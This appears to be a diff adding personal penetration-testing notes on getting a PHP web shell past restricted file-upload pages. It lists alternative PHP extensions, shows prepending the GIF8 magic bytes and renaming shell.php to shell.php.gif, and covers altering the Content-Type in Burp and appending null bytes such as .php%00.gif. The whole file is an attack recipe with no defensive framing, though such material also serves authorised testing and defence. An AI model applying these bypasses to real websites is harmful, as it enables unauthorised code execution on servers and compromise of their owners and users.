@@ -1,0 +1,28 @@
+php extensions to try on restricted upload pages:
+.php
+.php5
+.phtml
+.png.php
+.jpeg.php
+.pht
+.phpt
+.php3
+.php4
+.php6
+
+GIF bypass
+if .gif extension are allowed on a file upload system add:
+
+GIF8;
+ 
+to the top of a php file above <?php
+
+run the command: file shell.php and verify it shows GIF
+now change the file name using: mv shell.php shell.php.gif
+
+when doing a .jpeg.php upload bypass make sure to capture the request in burp
+after doing so make sure that content type is changed to image/jpeg instead of application/php
+
+if none of the following is working try adding null bytes to the extensions: Example below
+
+.php%00.gif, .php%00.jpg, .php%00.png, etc
